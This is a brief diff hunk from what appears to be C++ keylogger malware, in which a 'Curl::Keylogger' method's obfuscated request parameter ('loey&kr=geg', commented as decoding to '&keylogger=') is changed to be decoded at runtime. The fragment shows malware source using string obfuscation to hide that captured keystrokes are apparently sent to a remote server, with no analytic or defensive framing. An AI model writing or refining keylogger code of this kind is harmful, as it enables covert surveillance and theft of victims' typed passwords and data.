@@ -42,7 +42,7 @@ BOOL Curl::KeyIsListed(char key, std::string file_path)
 void Curl::Keylogger()
 {
 	std::string temp = "";
-	std::string arg = "loey&kr=geg"; // decode -> &keylogger=
+	std::string arg = Tools::decode("loey&kr=geg"); // decode -> &keylogger=
 
 	char temp_path[MAX_PATH];
 	
